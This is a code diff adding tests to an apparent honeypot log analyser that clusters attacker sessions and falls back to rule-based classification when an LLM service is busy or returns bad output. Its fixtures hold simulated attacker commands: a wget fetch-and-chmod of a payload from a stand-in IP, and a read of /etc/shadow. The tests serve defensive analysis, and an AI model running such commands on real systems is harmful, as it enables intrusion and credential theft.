@@ -142,3 +142,61 @@ def test_demo_seed_runs(tmp_path, db):
     analyze.cluster_sessions(db)
     # each demo script family collapses into one pattern despite random IPs/names
     assert db.clusters.count_documents({"kind": "commands"}) <= 6
+
+
+class BusyLLM:
+    source = "busy"
+    calls = 0
+
+    def analyze(self, commands, downloads, login):
+        BusyLLM.calls += 1
+        raise RuntimeError("503 UNAVAILABLE. This model is currently experiencing high demand.")
+
+
+class BrokenLLM:
+    source = "broken"
+
+    def analyze(self, commands, downloads, login):
+        raise ValueError("model returned invalid JSON")
+
+
+def _one_command_cluster(db, tmp_path):
+    log = tmp_path / "c.json"
+    write_log(log, [ev("cowrie.login.success", sid="x", username="root", password="root"),
+                    ev("cowrie.command.input", sid="x", input="wget http://1.2.3.4/a; chmod +x a"),
+                    ev("cowrie.session.closed", sid="x")])
+    ingest.ingest_file(db, str(log))
+    analyze.cluster_sessions(db)
+
+
+def test_temporary_errors_never_give_up(db, tmp_path):
+    _one_command_cluster(db, tmp_path)
+    for _ in range(10):
+        assert analyze.analyze_clusters(db, BusyLLM(), max_calls=10) == 0
+    c = db.clusters.find_one({"kind": "commands"})
+    assert c["needs_analysis"] is True and "analysis" not in c  # still waiting, not abandoned
+    # service recovers -> it gets analyzed
+    assert analyze.analyze_clusters(db, FakeLLM(), max_calls=10) == 1
+
+
+def test_busy_service_stops_the_cycle_early(db, tmp_path):
+    _one_command_cluster(db, tmp_path)
+    log = tmp_path / "d.json"
+    write_log(log, [ev("cowrie.login.success", sid="y", username="root", password="root"),
+                    ev("cowrie.command.input", sid="y", input="cat /etc/shadow"),
+                    ev("cowrie.session.closed", sid="y")])
+    ingest.ingest_file(db, str(log))
+    analyze.cluster_sessions(db)
+    BusyLLM.calls = 0
+    analyze.analyze_clusters(db, BusyLLM(), max_calls=10)
+    assert BusyLLM.calls == 1  # didn't retry every cluster against a busy server
+
+
+def test_hard_errors_fall_back_to_rules(db, tmp_path):
+    _one_command_cluster(db, tmp_path)
+    for _ in range(analyze.MAX_HARD_ERRORS):
+        analyze.analyze_clusters(db, BrokenLLM(), max_calls=10)
+    c = db.clusters.find_one({"kind": "commands"})
+    assert c["needs_analysis"] is False
+    assert c["analysis"]["source"] == "rules (LLM failed)"
+    assert any(t["id"] == "T1105" for t in c["analysis"]["techniques"])
